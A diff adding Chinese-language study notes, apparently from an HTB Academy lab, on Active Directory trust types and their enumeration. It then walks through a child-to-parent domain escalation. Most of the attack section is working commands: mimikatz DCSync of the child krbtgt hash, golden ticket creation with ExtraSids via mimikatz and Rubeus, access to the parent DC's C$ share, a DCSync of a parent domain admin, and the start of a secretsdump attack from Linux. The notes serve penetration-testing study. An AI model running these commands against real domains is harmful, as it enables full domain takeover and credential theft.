@@ -1,0 +1,74 @@
+父子 (Parent-child)：同一林中的两个或多个域。子域与父域具有双向可传递信任，子域 corp.inlanefreight.local 中的用户可以验证登录到父域 inlanefreight.local，反之亦然
+跨链接 (Cross-link)：子域之间的信任，用于加速身份验证
+外部 (External)：在两个独立林中、尚未通过林信任连接的两个独立域之间的不可传递信任，这种类型的信任利用 SID 筛选 (SID filtering) 或过滤掉非来自受信任域的身份验证请求（通过 SID）
+树根 (Tree-root)：林根域与新树根域之间的双向可传递信任。当你在林中设置一个新的树根域时，它们是按设计创建的
+林 (Forest)：两个林根域之间的可传递信任
+ESAE：用于管理 Active Directory 的堡垒林 (bastion forest)      https://learn.microsoft.com/en-us/security/privileged-access-workstations/esae-retirement
+
+
+信任可以是可传递的或不可传递的
+可传递 (transitive) 信任意味着信任关系会扩展到子域所信任的对象，如果 域 A 与 域 B 有信任关系，而 域 B 与 域 C 有 可传递 信任关系，那么 域 A 将自动信任 域 C
+不可传递 (non-transitive) 信任中，只有子域本身被信任，不会扩展到下一级子域
+
+
+信任可以设置两个方向：单向或双向（bidirectional）
+
+
+C:\htb> Import-Module activedirectory      枚举信任
+C:\htb> Get-ADTrust -Filter *
+可以利用 PowerView 和 BloodHound 来枚举信任关系、已建立的信任类型以及身份验证流程
+C:\htb> Get-DomainTrust            PowerView
+C:\htb> Get-DomainTrustMapping     递归，更详细
+C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName      检查子域中的用户
+另一个工具是 netdom
+C:\htb> netdom query /domain:inlanefreight.local trust
+C:\htb> netdom query /domain:inlanefreight.local dc
+C:\htb> netdom query /domain:inlanefreight.local workstation
+还可以使用 BloodHound 通过 Map Domain Trusts 预构建查询来可视化这些信任关系
+
+
+KRBTGT 帐户可用于创建 Kerberos TGT 票据
+这些票据可用于请求域中任何主机上任何服务的 TGS 票据，也被称为黄金票据攻击
+要使黄金票据失效的唯一方法是更改 KRBTGT 帐户的密码
+
+
+子域攻击父域Windows
+需要下面的信息
+  子域的 KRBTGT 哈希
+  子域的 SID
+  子域中目标用户的名称（无需真实存在！）
+  子域的 FQDN (完全限定域名)
+  根域的 Enterprise Admins 组的 SID
+
+C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt       获取 KRBTGT 帐户的 NT 哈希
+C:\htb> Get-DomainSID      获得域本身的SID
+C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid      获取 Enterprise Admins 组的 SID
+
+C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$      确认目前没有访问权限
+
+C:\htb> mimikatz.exe                              创建黄金票据
+mimikatz # kerberos::golden /user:hacker
+/domain:LOGISTICS.INLANEFREIGHT.LOCAL
+/sid:S-1-5-21-2806153819-209893948-922872689
+/krbtgt:9d765b482771505cbe97411065964d5f
+/sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+C:\htb> klist      查看目前内存中的hacker票据
+从这里开始，就可以访问父域内的任何资源
+C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$      可以访问了
+也可以使用 Rubeus 执行此攻击
+C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f
+/domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689
+/sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+cat \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt      查看文件
+
+通过对父域执行 DCSync 攻击来测试此访问权限，目标是 lab_adm 域管理员用户
+C:\Tools\mimikatz\x64> .\mimikatz.exe
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL            目标域与用户所在的域不同时，加确切目标域 /domain:INLANEFREIGHT.LOCA
+
+
+子域攻击父域Linux
+
+控制了子域后
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt      执行 DCSync 攻击
